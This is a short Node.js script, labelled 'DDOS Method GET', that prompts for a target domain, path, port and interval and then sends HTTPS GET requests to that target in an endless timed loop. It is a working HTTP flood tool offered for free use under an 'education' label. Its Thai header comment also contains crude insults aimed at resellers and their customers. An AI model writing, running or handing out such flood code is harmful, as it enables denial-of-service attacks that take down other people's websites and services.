/*
`````````````````````````````````````````````````````````
ทำเพือการศึกษา โดย TinnerKung
แจกได้จำหน่ายพ่องตาย
ของมันฟรีเสือกหาพ่อค้าดูด Script เอาไปโมให้เสียตัง
ลูกค้าแม่งก็ควายชิปหาย

- TinnerKung
- Facebook https://www.facebook.com/sycertinnerkung
- GitHub https://github.com/TinnerKung
- Website https://sycerteam.tk

`````````````````````````````````````````````````````````
*/

var readline = require('readline-sync');
var request = require('request');
var colors = require('colors');
const { exit } = require('process');

console.log(colors.rainbow("----------- DDOS Method GET -----------------------------"));
console.log(colors.cyan.underline("พิม yes | เปิดการใช้งาน"));
console.log(colors.cyan.underline("พิม no  | ปิดการใช้งาน"));
console.log(colors.rainbow("----------- Dev By TinnerKung ---------------------------"));
var menu = readline.question("เลือกโหมด: ");

if(menu == 'yes'){
   var link = readline.question("Doman: ");
   var paths = readline.question("ตำแหน่งไฟล์ ไม่มีใส่ // : ");
   var ports = readline.question("Port : ");
   var times = readline.question("Time 1s/1000t  : ");

function runflood() {
const https = require('https')
const options = {
  hostname: link,
  port: ports,
  path: paths,
  method: 'GET'
}
const req = https.request(options, (res) => {
  console.log(`statusCode: ${res.statusCode}`)
})
req.end()
};
setInterval(runflood, times);
};

if(menu == 'no'){
 
exit();

}
